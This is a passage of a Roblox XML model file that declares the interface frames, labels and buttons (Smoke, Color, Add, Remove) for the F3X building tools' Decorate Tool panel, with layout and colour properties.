									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.5</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">true</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX6C2EAF96FE104969BF12F41C48FC6709">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTDecorateToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>172</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>125</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXDB01AF7E0C4F4D918781BC96637C860A">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">BottomColorBar</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>1</YS>
										<YO>-2</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>2</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBX8BE82C2610A84ED88BC7ACBD562774BE">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX21C943C09FC441FAA38610BB1B169714">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX10BDFC40D80841539E4EF7D2B2E8749A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">DECORATE TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX368F930F19824D37923C7E35F4C932DF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXFCD524DAD5CC404EA562D23FC357FB7B">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.675000012</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Smoke</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXF1DDE03FF93D461BBDD43AB065E26880">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Smoke</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBX0841044430BB4029A16803B3865EE72F">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=134367382</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ArrowButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXECC5D3A317DB4AA1BFA5EAC1E7592433">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294946364</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX1701FD1541B84EE0A499FA7D5FCD602D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">AddButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-40</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXFB6B4F5788E44C1C89C3C03E29E29F86">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">RemoveButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>127</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>58</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXE0D4784A5A6048E780942C2773FFD72A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX4FBEBD1A356041C0BD75722D0FC92E80">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Options</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-3</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXCF9BA99554664224B4D93FF8A31BF30C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ColorOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>10</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX79AF3C17BD3245EAAFEF071EA31E4394">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Color</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX20CB7A5DC8F744CD94ED2C139F44AACA">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX1B79FBCCA12C4BDE82847BA1762B1633">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX2C37FAB231B04497A6F6BBC6F99ECBAE">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX9ECDABBB78C94480A63974E8C152C4CC">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294901760</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX92B85D6970CF45188AF8B1E71B99A4A0">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
